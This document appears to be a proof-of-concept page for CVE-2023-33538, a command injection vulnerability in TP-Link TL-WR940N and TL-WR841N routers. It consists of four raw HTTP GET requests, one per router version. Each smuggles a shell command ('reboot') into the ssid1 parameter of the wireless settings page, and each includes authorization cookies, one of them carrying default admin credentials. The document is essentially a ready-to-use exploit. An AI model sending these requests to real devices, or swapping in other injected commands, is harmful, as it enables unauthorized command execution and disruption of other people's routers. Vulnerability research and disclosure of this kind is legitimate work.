## TP-LINKTL-WR940N 命令执行漏洞（CVE-2023-33538)

```
The PoC of TL-WR940NV4 is as follows:
GET
/JFYRUKOAPAQZRKOC/userRpm/WlanNetworkRpm.htm?ssid1=TP-LINK_000012||reboot;&ssid2=
TP-LINK_0000_2&ssid3=TP-LINK_0000_3&ssid4=TP-LINK_0000_4&region=101&band=0&mode=6
&chanWidth=2&channel=15&rate=83&ap=1&broadcast=2&brlssid=&brlbssid=&addrType=1&key
type=1&wepindex=1&authtype=1&keytext=&Save=Save HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://127.0.0.1:8081/JFYRUKOAPAQZRKOC/userRpm/WlanNetworkRpm.htm
Cookie:
Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3
D
Upgrade-Insecure-Requests: 1


The PoC of TL-WR940NV2 is as follows:
GET
/UJOGPJXBZUFEBUDB/userRpm/WlanNetworkRpm.htm?ssid1=;reboot;&ssid2=TP-LINK_0000_2&
ssid3=TP-LINK_0000_3&ssid4=TP-LINK_0000_4&region=101&band=0&mode=5&chanWidth=1&c
hannel=9&rate=59&ap=1&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex =1&authtype=1&keytext=&Save=Save HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.0.1/KMODQNKANSQJBYFA/userRpm/WlanNetworkRpm.htm
Cookie:
Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3
D
Upgrade-Insecure-Requests: 1


The PoC of TL-WR841N V8 is as follows:
GET
/userRpm/WlanNetworkRpm.htm?ssid1=a;reboot&ssid2=TP-LINK_000000_2&ssi
d3=TP-LINK_000000_3&ssid4=TP-LINK_000000_4&region=101&band=0&mode=3&c
hanWidth=2&channel=15&rate=71&ap=1&broadcast=2&brlssid=&brlbssid=&add
rType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save HTTP/1.1
Host: 0.0.0.0:49168
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;
q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://0.0.0.0:49168/userRpm/WlanNetworkRpm.htm
Cookie: Authorization=
Upgrade-Insecure-Requests: 1


The PoC of TL-WR841N V10 is as follows:
GET
/GWIDNCGBKQNKXJXB/userRpm/WlanNetworkRpm.htm?ssid1=a;reboot;&ssid2=TP
-LINK_0000_2&ssid3=TP-LINK_0000_3&ssid4=TP-LINK_0000_4&region=101&ban
d=0&mode=5&chanWidth=2&channel=15&rate=71&ap=1&broadcast=2&brlssid=&b
rlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Sav
e HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)
Gecko/20100101 Firefox/109.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,imag
e/webp,*/*;q=0.8
Accept-Language:
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer:
http://127.0.0.1:8081/GWIDNCGBKQNKXJXB/userRpm/WlanNetworkRpm.htm
Cookie:
Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDF
mYzM%3D
Upgrade-Insecure-Requests: 1

```
